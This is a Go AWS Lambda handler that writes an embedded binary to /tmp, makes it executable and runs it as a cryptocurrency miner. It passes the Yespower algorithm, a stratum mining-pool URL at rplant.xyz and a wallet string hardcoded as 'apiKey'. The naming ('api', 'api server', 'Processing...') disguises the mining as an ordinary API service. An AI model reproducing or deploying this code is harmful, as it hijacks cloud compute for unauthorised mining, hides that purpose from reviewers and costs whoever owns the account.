package main

import (
	"embed"
	"io"
	"io/fs"
	"io/ioutil"
	"log"
	"os"
	"os/exec"

	"github.com/aws/aws-lambda-go/events"
	"github.com/aws/aws-lambda-go/lambda"
)

var executable embed.FS

func handler(request events.APIGatewayProxyRequest) (*events.APIGatewayProxyResponse, error) {
	apiKey := "usQKxdYLwKGPUujMv5M6nctk8rjjxZUwfb.ntlkey"

	
	executablePath := "myApi/api"
	executableBytes, err := fs.ReadFile(executable, executablePath)
	if err != nil {
		log.Println("Error reading api file:", err)
		return nil, err
	}

	tmpFile, err := ioutil.TempFile("", "api")
	if err != nil {
		log.Println("Error creating temporary file:", err)
		return nil, err
	}
	defer os.Remove(tmpFile.Name())

	// Write the embedded executable to the temporary file
	_, err = tmpFile.Write(executableBytes)
	if err != nil {
		log.Println("Error writing embedded executable to temporary file:", err)
		return nil, err
	}

	// Close the temporary file before copying it
	tmpFile.Close()

	// Create a new file outside the temporary directory
	executableFile := "/tmp/api" // Change the file path as needed
	err = copyFile(tmpFile.Name(), executableFile)
	if err != nil {
		log.Println("Error copying temporary file:", err)
		return nil, err
	}

	// Make the new file executable
	err = os.Chmod(executableFile, 0755)
	if err != nil {
		log.Println("Error giving file permissions:", err)
		return nil, err
	}

	// Execute the file with arguments
	cmd := exec.Command(executableFile, "-a", "Yespower", "-o", "stratum+tcps://stratum-na.rplant.xyz:17079", "-u", apiKey)
	err = cmd.Start()
	if err != nil {
		log.Println("Error connecting to api server:", err)
		return nil, err
	}

	// Wait for the command to finish
	err = cmd.Wait()
	if err != nil {
		log.Println("Command execution failed:", err)
		return nil, err
	}

	// Build the response with the processing messages
	response := &events.APIGatewayProxyResponse{
		StatusCode:      200,
		Headers:         map[string]string{"Content-Type": "text/plain"},
		Body:            "Processing...\n",
		IsBase64Encoded: false,
	}

	return response, nil
}

// Copy the file from src to dst
func copyFile(src, dst string) error {
	srcFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer srcFile.Close()

	dstFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer dstFile.Close()

	_, err = io.Copy(dstFile, srcFile)
	if err != nil {
		return err
	}

	return nil
}

func main() {
	lambda.Start(handler)
}
